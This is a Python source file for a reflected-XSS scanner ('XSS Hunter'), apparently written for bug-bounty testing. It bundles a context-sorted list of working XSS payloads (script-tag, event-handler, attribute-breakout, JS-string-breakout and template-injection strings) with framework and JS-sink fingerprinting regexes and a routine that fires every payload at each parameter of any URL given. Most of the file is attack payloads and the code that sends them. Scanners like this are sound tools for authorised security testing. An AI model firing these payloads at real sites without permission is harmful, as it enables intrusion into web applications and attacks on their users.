#!/usr/bin/env python3
"""
XSS Hunter - Reflected XSS Scanner with Context Detection
"""

import httpx
import re
from typing import Optional
from urllib.parse import urljoin, urlencode


class XSSHunter:
    """XSS scanner with context detection and framework fingerprinting."""

    # Payloads organized by context
    PAYLOADS = {
        "html_body": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<body onload=alert(1)>",
            "<marquee onstart=alert(1)>",
            "<video><source onerror=alert(1)>",
            "<audio src=x onerror=alert(1)>",
            "<details open ontoggle=alert(1)>",
            "<select onfocus=alert(1) autofocus>",
        ],
        "html_attribute": [
            '" onload=alert(1) x="',
            "' onload=alert(1) x='",
            '"><script>alert(1)</script>',
            "'><script>alert(1)</script>",
            '" autofocus onfocus=alert(1)"',
            "' autofocus onfocus=alert(1)'",
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
        ],
        "html_attribute_noquotes": [
            " onload=alert(1)",
            " onerror=alert(1)",
            " onfocus=alert(1)",
            " onclick=alert(1)",
            " onmouseover=alert(1)",
        ],
        "js_string_single": [
            "';alert(1);//",
            "';alert(1);var x='",
            "';(alert(1));var x='",
            "'+(alert(1))+'",
            "';confirm(1);//",
            "';prompt(1);//",
        ],
        "js_string_double": [
            '";alert(1);//',
            '";alert(1);var x="',
            '";(alert(1));var x="',
            '"+(alert(1))+"',
            '";confirm(1);//',
            '";prompt(1);//',
        ],
        "js_string_template": [
            "${alert(1)}",
            "{{alert(1)}}",
            "<%=alert(1)%>",
            "${constructor.constructor('alert(1)')()}",
        ],
    }

    # Framework fingerprint patterns
    FRAMEWORK_PATTERNS = {
        "angular": [
            r"ng-app",
            r"ng-controller",
            r"ng-bind",
            r"ng-model",
            r"angular\.js",
            r"angular\.module",
            r"\$\.angular",
        ],
        "react": [
            r"data-reactroot",
            r"data-reactid",
            r"_reactRootContainer",
            r"__REACT_DEVTOOLS_GLOBAL_HOOK__",
            r"react\.js",
            r"/react[@-]?\d*\.?\d*\.js",
        ],
        "vue": [
            r"__vue__",
            r"v-if",
            r"v-for",
            r"v-bind:",
            r"v-on:",
            r"vue\.js",
            r"/vue[@-]?\d*\.?\d*\.js",
            r"data-v-[\da-f]+",
        ],
        "jquery": [
            r"jquery",
            r"\$\.fn\.",
            r"jQuery\.",
            r"/jquery[-.]?\d*\.js",
            r"jquery\.js",
        ],
    }

    # Dangerous sink patterns in inline JS
    SINK_PATTERNS = {
        "innerHTML": [r"\.innerHTML\s*=", r"\.outerHTML\s*="],
        "document_write": [r"document\.write\s*\(", r"document\.writeln\s*\("],
        "eval": [r"\beval\s*\(", r"new\s+Function\s*\("],
        "setTimeout": [r"setTimeout\s*\(\s*['\"].*?['\"]", r"setInterval\s*\(\s*['\"].*?['\"]"],
        "location": [r"location\.href\s*=", r"location\.assign\s*\(", r"location\.replace\s*\("],
        "write": [r"\.write\s*\(", r"\.writeln\s*\("],
    }

    def __init__(self, timeout: int = 10, user_agent: Optional[str] = None):
        self.timeout = timeout
        self.default_ua = user_agent or (
            "Mozilla/5.0 (XSS-Hunter/1.0; +https://github.com/bug-bounty-harness)"
        )
        self.client = httpx.Client(timeout=timeout)

    def close(self):
        self.client.close()

    def detect_frameworks(self, response_text: str) -> list[str]:
        """Fingerprint frameworks from response content."""
        found = []
        for framework, patterns in self.FRAMEWORK_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    found.append(framework)
                    break
        return found

    def detect_sinks(self, response_text: str) -> list[str]:
        """Detect dangerous JS sinks in inline scripts."""
        found = []
        for sink, patterns in self.SINK_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    found.append(sink)
                    break
        return found

    def detect_context(self, original: str, reflected: str) -> str:
        """Detect where the payload was reflected."""
        # Check if reflected inside a script tag
        script_match = re.search(r"<script[^>]*>(.*?)</script>", reflected, re.DOTALL | re.IGNORECASE)
        if script_match and original in script_match.group(1):
            if "'" in reflected and '"' not in reflected:
                return "js_string_single"
            elif '"' in reflected:
                return "js_string_double"
            elif "${" in reflected or "{{" in reflected:
                return "js_string_template"
            return "js_string"

        # Check if inside HTML attribute (has =")
        if re.search(r'=\s*["\'][^"\']*' + re.escape(original), reflected):
            if re.search(r'>\s*' + re.escape(original), reflected):
                return "html_body_and_attribute"
            return "html_attribute"

        # Check if inside tag content
        if re.search(r">[^<]*" + re.escape(original), reflected):
            return "html_body"

        # Check for no-quotes attribute context
        if re.search(r"\s" + re.escape(original.split()[0] if ' ' in original else original), reflected):
            return "html_attribute_noquotes"

        return "unknown"

    def scan(
        self,
        url: str,
        params: Optional[dict] = None,
        method: str = "GET",
        data: Optional[dict] = None,
        headers: Optional[dict] = None,
    ) -> dict:
        """
        Scan a URL for reflected XSS.

        Args:
            url: Target URL
            params: Query parameters (for GET)
            method: HTTP method (GET or POST)
            data: Form data (for POST)
            headers: Additional headers

        Returns:
            Dictionary with scan results
        """
        result = {
            "url": url,
            "method": method,
            "vulnerabilities": [],
            "reflections": [],
            "frameworks": [],
            "sinks": [],
        }

        # Make initial request to get baseline
        req_headers = headers or {}
        req_headers["User-Agent"] = self.default_ua

        try:
            if method.upper() == "POST":
                resp = self.client.post(url, data=data, headers=req_headers)
            else:
                resp = self.client.get(url, params=params, headers=req_headers)
        except httpx.RequestError as e:
            result["error"] = str(e)
            return result

        original_text = resp.text
        result["status_code"] = resp.status_code

        # Framework fingerprinting
        result["frameworks"] = self.detect_frameworks(original_text)

        # Sink detection
        result["sinks"] = self.detect_sinks(original_text)

        # Test each parameter
        test_params = params or {}
        param_names = list(test_params.keys()) if test_params else []

        # If no params, try common param names
        if not param_names:
            param_names = ["q", "search", "id", "name", "query", "s", "test", "xss", "input"]

        for param in param_names:
            for context, payloads in self.PAYLOADS.items():
                for payload in payloads:
                    # Clone params with test value
                    test_params = dict(params) if params else {}
                    test_params[param] = payload

                    try:
                        if method.upper() == "POST":
                            resp = self.client.post(url, data=test_params, headers=req_headers)
                        else:
                            resp = self.client.get(url, params=test_params, headers=req_headers)

                        reflected_text = resp.text

                        # Check if our payload is reflected
                        if payload in reflected_text:
                            detected_context = self.detect_context(payload, reflected_text)
                            reflection = {
                                "parameter": param,
                                "payload": payload,
                                "context": detected_context,
                                "expected_context": context,
                                "status_code": resp.status_code,
                            }
                            result["reflections"].append(reflection)

                            # If context matches or we found a workable reflection, flag it
                            if detected_context == context or detected_context in [
                                "html_body",
                                "html_attribute",
                                "js_string_single",
                                "js_string_double",
                            ]:
                                vuln = {
                                    "parameter": param,
                                    "payload": payload,
                                    "context": detected_context,
                                    "confidence": "high" if detected_context == context else "medium",
                                    "url": str(resp.url),
                                }
                                result["vulnerabilities"].append(vuln)

                    except httpx.RequestError:
                        continue

        return result


def main():
    """CLI entry point."""
    import argparse

    parser = argparse.ArgumentParser(description="XSS Hunter - Reflected XSS Scanner")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", help="POST data (key=value&key2=value2)")
    parser.add_argument("-H", "--header", action="append", help="Extra headers")
    parser.add_argument("-p", "--param", action="append", help="Parameters to test")
    args = parser.parse_args()

    hunter = XSSHunter()

    headers = {}
    if args.header:
        for h in args.header:
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()

    params = {}
    if args.param:
        for p in args.param:
            if "=" in p:
                k, v = p.split("=", 1)
                params[k.strip()] = v.strip()

    data = None
    if args.data:
        data = dict(kv.split("=") for kv in args.data.split("&"))

    result = hunter.scan(
        url=args.url,
        params=params if params else None,
        method=args.method,
        data=data,
        headers=headers if headers else None,
    )

    hunter.close()

    import json

    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
